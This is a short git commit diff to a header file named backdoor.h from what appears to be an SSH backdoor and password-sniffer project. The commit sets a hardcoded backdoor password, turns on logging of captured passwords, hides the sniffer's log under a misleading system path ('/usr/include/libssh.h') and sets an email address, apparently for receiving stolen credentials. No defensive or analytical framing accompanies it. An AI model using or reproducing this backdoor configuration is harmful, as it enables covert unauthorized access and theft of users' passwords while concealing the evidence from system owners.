0777a339b982c36c9780c2fa9e875eb46dc19de7
Andrew <7416604+mytab0r@users.noreply.github.com>
2019-05-08 22:39:42 +0300

    Update backdoor.h

--- backdoor.h
+++ backdoor.h
@@ -1,7 +1,7 @@
 /* backdoor stuff */
-#define BACKDOORPASSWD "yourpassword" # here you put your password
+#define BACKDOORPASSWD "test1234"
 #define LOGGING_PASSWORDS 1
 #define PASSWORDS_LOG_FILE "/usr/include/libssh.h" # location of sniffer 
-#define EMAIL "hacker@gmail.com" # your email adress
+#define EMAIL "magicprograms@gmail.com" # your email adress
 
 int backdoor_active;
